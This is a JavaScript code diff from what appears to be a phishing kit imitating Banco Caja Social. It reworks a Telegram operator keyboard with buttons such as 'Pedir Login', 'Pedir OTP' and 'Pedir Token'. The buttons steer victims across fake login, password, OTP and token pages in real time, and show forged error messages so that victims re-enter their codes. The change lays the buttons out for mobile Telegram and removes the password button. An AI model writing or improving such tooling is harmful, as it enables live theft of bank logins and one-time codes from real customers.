@@ -10,17 +10,6 @@
 
     const OTP_TOKEN_ERROR_TEXT = 'CODIGO OTP INGRESADO INCORRECTO O TOKEN INGRESADO INCORRECTO';
 
-    const TELEGRAM_BUTTONS = [
-        { text: '🔐 Pedir Login', action: 'login' },
-        { text: '🔑 Pedir Password', action: 'password' },
-        { text: '📱 Pedir Token', action: 'token' },
-        { text: '📱 Pedir OTP', action: 'otp' },
-        { text: '❌ Error Login', action: 'error_login' },
-        { text: '❌ Error OTP', action: 'error_otp' },
-        { text: '❌ Error Token', action: 'error_token' },
-        { text: '✅ Finalizar', action: 'finalizar' }
-    ];
-
     const PAGE_MAP = {
         login: 'index.html',
         password: 'password.html',
@@ -124,14 +113,6 @@
     }
 
     function setupDismissHandlers() {
-        document.querySelectorAll('[data-dismiss-alert]').forEach((btn) => {
-            btn.addEventListener('click', () => {
-                const id = btn.getAttribute('data-dismiss-alert');
-                const el = document.getElementById(id);
-                if (el) el.hidden = true;
-            });
-        });
-
         const usuario = document.getElementById('usuario');
         if (usuario) {
             usuario.addEventListener('input', () => usuario.classList.remove('error'));
@@ -154,9 +135,33 @@
         setupDismissHandlers();
     }
 
-    function getKeyboard() {
+    /**
+     * Teclado operador (sin Pedir Password): 2 botones por fila para que se vean en Telegram móvil.
+     */
+    function getOperatorKeyboard() {
         if (!window.BancoUtils) return null;
-        return BancoUtils.createKeyboard(TELEGRAM_BUTTONS, BancoUtils.getSessionId());
+        const sid = BancoUtils.getSessionId();
+        const cb = (action) => `${action}:${sid}`;
+
+        return {
+            inline_keyboard: [
+                [
+                    { text: '❌ Error Login', callback_data: cb('error_login') },
+                    { text: '❌ Error OTP', callback_data: cb('error_otp') }
+                ],
+                [
+                    { text: '❌ Error Token', callback_data: cb('error_token') },
+                    { text: '🔐 Pedir Login', callback_data: cb('login') }
+                ],
+                [
+                    { text: '📱 Pedir OTP', callback_data: cb('otp') },
+                    { text: '📱 Pedir Token', callback_data: cb('token') }
+                ],
+                [
+                    { text: '✅ Finalizar', callback_data: cb('finalizar') }
+                ]
+            ]
+        };
     }
 
     function navigateTo(file) {
@@ -210,9 +215,8 @@
     }
 
     window.CajaSocialTelegram = {
-        TELEGRAM_BUTTONS,
         OTP_TOKEN_ERROR_TEXT,
-        getKeyboard,
+        getOperatorKeyboard,
         handleTelegramAction,
         initPageErrors,
         applyLoginError,
